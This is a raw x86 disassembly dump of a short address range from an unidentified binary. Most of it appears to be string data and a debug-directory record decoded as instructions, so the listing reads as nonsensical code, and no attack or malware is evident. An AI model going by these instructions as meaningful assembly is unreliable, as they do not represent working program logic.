  4339c3:	push   ebp
  4339c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4339c7:	ss pop edi
  4339c9:	pop    edx
  4339ca:	push   edi
  4339cb:	inc    esp
  4339cc:	xor    BYTE PTR [eax],al
  4339ce:	dec    ecx
  4339cf:	inc    edi
  4339d0:	xor    eax,0x3058555f
  4339d5:	dec    ebx
  4339d6:	pop    edi
  4339d7:	push   edi
  4339d8:	add    BYTE PTR [eax+0x0],bl
  4339db:	inc    edi
  4339dc:	add    BYTE PTR [edx+0x0],al
  4339df:	pop    edi
  4339e0:	add    BYTE PTR [ebx],dh
  4339e2:	add    BYTE PTR [eax],bh
  4339e4:	add    BYTE PTR [ebx+0x0],cl
  4339e7:	xor    eax,0x33003500
  4339ec:	add    BYTE PTR [eax],dh
  4339ee:	add    BYTE PTR [edi+0x0],bl
  4339f1:	push   esp
  4339f2:	add    BYTE PTR [ebp+0x0],cl
  4339f5:	xor    BYTE PTR [eax],al
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	inc    esi
  4339fa:	add    BYTE PTR [eax+0x0],bl
  4339fd:	xor    BYTE PTR [eax],al
  4339ff:	pop    edi
  433a00:	add    BYTE PTR [ecx],dh
  433a02:	add    BYTE PTR [ebx+0x0],al
  433a05:	xor    eax,0x5f003100
  433a0a:	add    BYTE PTR [ecx+0x0],al
  433a0d:	xor    eax,DWORD PTR [eax]
  433a0f:	add    BYTE PTR [eax],al
  433a11:	push   ebx
  433a12:	add    BYTE PTR [ebx+0x0],dl
  433a15:	dec    eax
  433a16:	add    BYTE PTR [edi+0x0],bl
  433a19:	push   esp
  433a1a:	add    BYTE PTR [ebx+0x0],al
  433a1d:	push   ebx
  433a1e:	add    BYTE PTR [edx+0x0],dl
  433a21:	pop    edi
  433a22:	add    BYTE PTR [ecx+0x0],dl
  433a25:	dec    edi
  433a26:	add    BYTE PTR [edi+0x0],al
  433a29:	push   ecx
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	pop    ecx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],cl
  433a33:	dec    edi
  433a34:	add    BYTE PTR [ebp+0x0],dl
  433a37:	cmp    DWORD PTR [eax],eax
  433a39:	pop    edi
  433a3a:	add    BYTE PTR [edx],dh
  433a3c:	add    BYTE PTR [eax+eax*1+0x32],al
  433a40:	add    BYTE PTR ds:0x47005f00,dh
  433a46:	add    BYTE PTR ds:0x48000000,dh
  433a4c:	add    BYTE PTR [edx+0x0],cl
  433a4f:	push   eax
  433a50:	add    BYTE PTR [edi+0x0],bl
  433a53:	cmp    BYTE PTR [eax],al
  433a55:	add    BYTE PTR ss:0x55004100,dh
  433a5c:	add    BYTE PTR [edi+0x0],bl
  433a5f:	push   edx
  433a60:	add    BYTE PTR [edi],dh
  433a62:	add    BYTE PTR [ecx+0x0],cl
  433a65:	add    BYTE PTR [eax],al
  433a67:	inc    esp
  433a68:	add    BYTE PTR [ecx+0x0],dl
  433a6b:	inc    edx
  433a6c:	add    BYTE PTR [edi+0x0],bl
  433a6f:	push   ecx
  433a70:	add    BYTE PTR [ecx+0x0],bl
  433a73:	dec    edi
  433a74:	add    BYTE PTR [eax+0x0],dl
  433a77:	add    BYTE PTR [eax],al
  433a79:	dec    edx
  433a7a:	add    BYTE PTR [ecx+0x0],dl
  433a7d:	inc    esp
  433a7e:	add    BYTE PTR [edi+0x0],bl
  433a81:	dec    edx
  433a82:	add    BYTE PTR [eax],dh
  433a84:	add    BYTE PTR [ecx],dh
  433a86:	add    BYTE PTR [ebx+0x0],dl
  433a89:	push   ecx
  433a8a:	add    BYTE PTR [ecx],dh
  433a8c:	add    BYTE PTR [edi+0x0],bl
  433a8f:	push   edi
  433a90:	add    BYTE PTR [eax],al
  433a92:	add    BYTE PTR [ebx+0x0],cl
  433a95:	pop    edx
  433a96:	add    BYTE PTR [esi],dh
  433a98:	add    BYTE PTR [edi+0x0],bl
  433a9b:	inc    ebx
  433a9c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433aa0:	add    BYTE PTR [edi+0x0],bl
  433aa3:	push   edi
  433aa4:	add    BYTE PTR [ebx],dh
  433aa6:	add    BYTE PTR [esi+0x0],cl
  433aa9:	push   ebp
  433aaa:	add    BYTE PTR [edi+0x0],bl
  433aad:	dec    edx
  433aae:	add    BYTE PTR [eax],al
  433ab0:	add    BYTE PTR [edi+0x0],dl
  433ab3:	aaa    
  433ab4:	add    BYTE PTR [eax],bh
  433ab6:	add    BYTE PTR [edi+0x0],bl
  433ab9:	pop    eax
  433aba:	add    BYTE PTR [edi+0x0],cl
  433abd:	inc    edi
  433abe:	add    BYTE PTR [edi+0x0],bl
  433ac1:	xor    al,0x0
  433ac3:	push   eax
  433ac4:	add    BYTE PTR [ecx+0x0],cl
  433ac7:	push   ebp
  433ac8:	add    BYTE PTR [eax],al
  433aca:	add    BYTE PTR [edi+0x0],dl
  433acd:	push   esp
  433ace:	add    BYTE PTR [ebx+0x0],cl
  433ad1:	add    BYTE PTR [eax],al
  433ad3:	add    BYTE PTR [edx+0x53],dl
  433ad6:	inc    esp
  433ad7:	push   ebx
  433ad8:	xor    ah,BYTE PTR [ecx-0x137be6ec]
  433ade:	rol    BYTE PTR [ecx-0x56],0x1d
  433ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ae3:	stos   BYTE PTR es:[edi],al
  433ae4:	inc    eax
  433ae5:	jns    0x433a6d
  433ae7:	dec    ecx
  433ae8:	sbb    eax,DWORD PTR [eax]
  433aea:	add    BYTE PTR [eax],al
  433aec:	push   esp
  433aed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433af1:	addr16 push edi
  433af3:	bound  bx,DWORD PTR [edx+0x45]
  433af7:	outs   dx,BYTE PTR ds:[esi]
  433af8:	pop    esp
  433af9:	je     0x433b6e
  433afb:	ja     0x433b3e
  433afd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433b05:	js     0x433b76
  433b07:	jp     0x433b78
  433b09:	jns    0x433b6f
  433b0b:	jp     0x433b75
  433b0d:	je     0x433b73
  433b0f:	jp     0x433b73
  433b11:	cs jo  0x433b78
  433b14:	bound  eax,QWORD PTR [eax]
	...
